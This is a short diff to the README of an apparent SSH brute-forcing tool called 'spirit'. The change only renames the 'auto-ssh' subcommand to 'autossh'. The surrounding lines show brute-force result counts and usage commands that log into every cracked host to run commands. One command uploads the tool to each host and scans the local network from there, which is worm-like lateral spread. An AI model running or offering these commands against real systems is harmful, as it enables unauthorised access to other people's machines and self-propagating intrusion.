@@ -122,9 +122,9 @@ Hosts[26803] Bruted[4000] Blocked[19803] Found[3000]
 ./spirit brute --block=true
 
 # Connect to all your found hosts automatically & run commands.
-$ ./spirit auto-ssh --command 'whoami && uptime'
+$ ./spirit autossh --command 'whoami && uptime'
 # Upload spirit to all hosts and scan the LAN
-$ ./spirit auto-ssh --upload ./spirit --command '/tmp/spirit scan --lan'
+$ ./spirit autossh --upload ./spirit --command '/tmp/spirit scan --lan'
 ```
 
 ## Spirit is Free (sorta)
